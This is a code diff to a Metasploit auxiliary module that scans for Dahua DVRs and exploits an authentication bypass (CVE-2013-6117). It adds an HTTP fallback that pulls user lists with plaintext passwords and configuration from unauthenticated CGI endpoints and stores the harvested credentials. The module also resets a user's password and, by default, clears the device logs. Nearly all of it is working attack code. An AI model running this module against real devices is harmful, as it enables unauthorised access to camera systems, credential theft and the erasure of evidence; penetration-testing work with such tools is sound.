@@ -11,7 +11,7 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'        => 'Dahua DVR Auth Bypass Scanner',
-      'Description' => "Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user's password and clears the device logs.",
+      'Description' => "Scans for Dahua-based DVRs and grabs settings via the binary TCP protocol (CVE-2013-6117, port 37777) and optionally via HTTP for newer firmware (port 80/443). Optionally resets a user's password and clears the device logs.",
       'Author'      => [
         'Tyler Bennett - Talos Consulting', # Metasploit module
         'Jake Reynolds - Depth Security',   # Vulnerability Discoverer
@@ -38,13 +38,31 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      OptString.new('USERNAME',  [false, 'A username to reset', '888888']),
-      OptString.new('PASSWORD',  [false, 'A password to reset the user with; random if not set']),
-      OptBool.new('CLEAR_LOGS', [true, "Clear the DVR logs when we're done?", true]),
-      OptInt.new('TIMEOUT',     [true, 'Timeout in seconds for socket reads', 10]),
+      OptString.new('USERNAME',      [false, 'A username to reset', '888888']),
+      OptString.new('PASSWORD',      [false, 'A password to reset the user with; random if not set']),
+      OptBool.new('CLEAR_LOGS',     [true,  "Clear the DVR logs when we're done?", true]),
+      OptInt.new('TIMEOUT',         [true,  'Timeout in seconds for socket reads', 10]),
+      OptBool.new('HTTP_FALLBACK',  [false, 'Also probe HTTP interface for newer Dahua firmware', false]),
+      OptInt.new('HTTP_PORT',       [false, 'Port for HTTP fallback probe', 80]),
+      OptBool.new('HTTP_SSL',       [false, 'Use HTTPS for HTTP fallback', false]),
       Opt::RPORT(37777)
     ])
   end
+
+  # HTTP signatures present in Dahua web interface headers or response bodies
+  DAHUA_HTTP_SIGS = [
+    /Dahua-Webs/i,   # Server header on most Dahua firmware
+    /DHttp/i,        # Alternate Dahua server header
+    /DH_WEB/i,       # Body marker in older web UI
+    /webLogin/i,     # Login page JS reference
+    /"session"\s*:/i # JSON-RPC session field in login challenge
+  ].freeze
+
+  # Unauthenticated CGI endpoints known to expose data on unpatched firmware
+  DAHUA_HTTP_PATHS = {
+    users:  '/cgi-bin/userManager.cgi?action=getUserInfoAll',
+    config: '/cgi-bin/configManager.cgi?action=getConfig&name=General'
+  }.freeze
 
   # FIX: binary constant strings kept as-is; only logic that uses them is fixed below
   U1 = "\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
@@ -362,29 +380,178 @@ class MetasploitModule < Msf::Auxiliary
     "#{rhost}:#{rport}"
   end
 
+  # ---------------------------------------------------------------------------
+  # HTTP fallback — newer Dahua firmware (port 80/443)
+  # ---------------------------------------------------------------------------
+
+  def http_peer(ip)
+    "#{ip}:#{datastore['HTTP_PORT']}"
+  end
+
+  def http_client(ip)
+    Rex::Proto::Http::Client.new(
+      ip,
+      datastore['HTTP_PORT'].to_i,
+      {},
+      datastore['HTTP_SSL'],
+      nil,
+      nil
+    )
+  end
+
+  # Single HTTP GET; returns Rex::Proto::Http::Response or nil on error.
+  def http_request(ip, uri)
+    cli = http_client(ip)
+    begin
+      cli.connect(datastore['TIMEOUT'])
+      req  = cli.request_raw(
+        'method'  => 'GET',
+        'uri'     => uri,
+        'headers' => { 'Connection' => 'close' }
+      )
+      cli.send_recv(req, datastore['TIMEOUT'])
+    rescue ::Rex::ConnectionError, ::EOFError, ::Timeout::Error => e
+      vprint_error("#{http_peer(ip)} -- HTTP error: #{e.message}")
+      nil
+    ensure
+      cli.close rescue nil
+    end
+  end
+
+  # Returns true if any Dahua signature is found in the response.
+  # Checks / first (server header), then /cgi-bin/global.login (JSON challenge).
+  def http_fingerprint(ip)
+    [
+      '/',
+      '/cgi-bin/global.login'
+    ].any? do |path|
+      resp = http_request(ip, path)
+      next false unless resp
+      DAHUA_HTTP_SIGS.any? { |sig| resp.to_s =~ sig }
+    end
+  end
+
+  # Attempts unauthenticated user list extraction.
+  # Vulnerable on Dahua firmware that did not apply the 2021 patch.
+  # Response format: users[N].Name=<user>\r\nusers[N].Password=<pass>\r\n
+  def http_get_users(ip)
+    resp = http_request(ip, DAHUA_HTTP_PATHS[:users])
+    return unless resp && resp.code == 200 && resp.body =~ /\.Name=/
+
+    hp = http_peer(ip)
+    print_good("#{hp} -- Unauthenticated user list via HTTP (auth bypass confirmed)")
+
+    users_table = Rex::Text::Table.new(
+      'Header'  => 'Dahua HTTP Users',
+      'Indent'  => 1,
+      'Columns' => ['Host', 'Username', 'Password']
+    )
+
+    resp.body.scan(/users\[(\d+)\]\.Name=([^\r\n]+)/) do |idx, uname|
+      uname.strip!
+      pmatch = resp.body.match(/users\[#{Regexp.escape(idx)}\]\.Password=([^\r\n]+)/)
+      pass   = pmatch ? pmatch[1].strip : ''
+
+      users_table << [hp, uname, pass]
+      next if uname.empty? || pass.empty?
+
+      report_http_cred(ip, datastore['HTTP_PORT'], uname, pass)
+      report_vuln(
+        host:  ip,
+        port:  datastore['HTTP_PORT'],
+        proto: 'tcp',
+        sname: datastore['HTTP_SSL'] ? 'https' : 'http',
+        name:  'Dahua DVR Unauthenticated Credential Exposure via HTTP',
+        info:  "Obtained credentials for user #{uname} via unauthenticated HTTP endpoint",
+        refs:  references
+      )
+    end
+    users_table.print
+  end
+
+  # Attempts unauthenticated general config fetch.
+  # Some firmware exposes this without auth; response lines are table.General.*=value.
+  def http_get_config(ip)
+    resp = http_request(ip, DAHUA_HTTP_PATHS[:config])
+    return unless resp && resp.code == 200 && resp.body =~ /table\./
+
+    print_good("#{http_peer(ip)} -- Unauthenticated config access via HTTP")
+    print_status(resp.body.strip)
+  end
+
+  # Entry point for the HTTP probe — fingerprint first, then attempt data extraction.
+  def http_probe(ip)
+    hp = http_peer(ip)
+    unless http_fingerprint(ip)
+      vprint_status("#{hp} -- No Dahua HTTP interface detected")
+      return
+    end
+
+    print_good("#{hp} -- Dahua web interface detected (HTTP)")
+    report_service(
+      host:  ip,
+      port:  datastore['HTTP_PORT'],
+      proto: 'tcp',
+      sname: datastore['HTTP_SSL'] ? 'https' : 'http',
+      info:  'Dahua DVR HTTP interface'
+    )
+
+    http_get_users(ip)
+    http_get_config(ip)
+  end
+
+  def report_http_cred(ip, port, user, pass)
+    service_data = {
+      address:      ip,
+      port:         port,
+      service_name: datastore['HTTP_SSL'] ? 'https' : 'http',
+      protocol:     'tcp',
+      workspace_id: myworkspace_id
+    }
+    credential_data = {
+      module_fullname: fullname,
+      origin_type:     :service,
+      private_data:    pass,
+      private_type:    :password,
+      username:        user
+    }.merge(service_data)
+    create_credential_login({
+      core:   create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data))
+  end
+
+  # ---------------------------------------------------------------------------
+
   # FIX #8: run_host no longer calls connect/disconnect itself; dahua_fingerprint handles its
   # own connection, and each action method manages its own connection via ensure blocks.
   # This eliminates the double-connect issue where run_host's ensure disconnect could fire
   # while an action method's socket was still open.
-  def run_host(_ip)
-    return unless dahua_fingerprint
+  def run_host(ip)
+    # TCP binary protocol (CVE-2013-6117, port 37777)
+    if dahua_fingerprint
+      print_good("#{peer} -- Dahua DVR found (TCP/#{rport})")
+      report_service(host: rhost, port: rport, sname: 'dvr', info: 'Dahua-based DVR (TCP)')
 
-    print_good("#{peer} -- Dahua-based DVR found")
-    report_service(host: rhost, port: rport, sname: 'dvr', info: 'Dahua-based DVR')
+      case action.name.upcase
+      when 'CHANNEL' then grab_channels
+      when 'DDNS'    then grab_ddns
+      when 'EMAIL'   then grab_email
+      when 'GROUP'   then grab_groups
+      when 'NAS'     then grab_nas
+      when 'RESET'   then reset_user
+      when 'SERIAL'  then grab_serial
+      when 'USER'    then grab_users
+      when 'VERSION' then grab_version
+      end
 
-    case action.name.upcase
-    when 'CHANNEL' then grab_channels
-    when 'DDNS'    then grab_ddns
-    when 'EMAIL'   then grab_email
-    when 'GROUP'   then grab_groups
-    when 'NAS'     then grab_nas
-    when 'RESET'   then reset_user
-    when 'SERIAL'  then grab_serial
-    when 'USER'    then grab_users
-    when 'VERSION' then grab_version
+      clear_logs if datastore['CLEAR_LOGS']
+    else
+      vprint_status("#{peer} -- No Dahua TCP response on port #{rport}")
     end
 
-    clear_logs if datastore['CLEAR_LOGS']
+    # HTTP fallback for newer Dahua firmware (opt-in via HTTP_FALLBACK)
+    http_probe(ip) if datastore['HTTP_FALLBACK']
   end
 
   def report_hash(rhost, rport, user, hash)
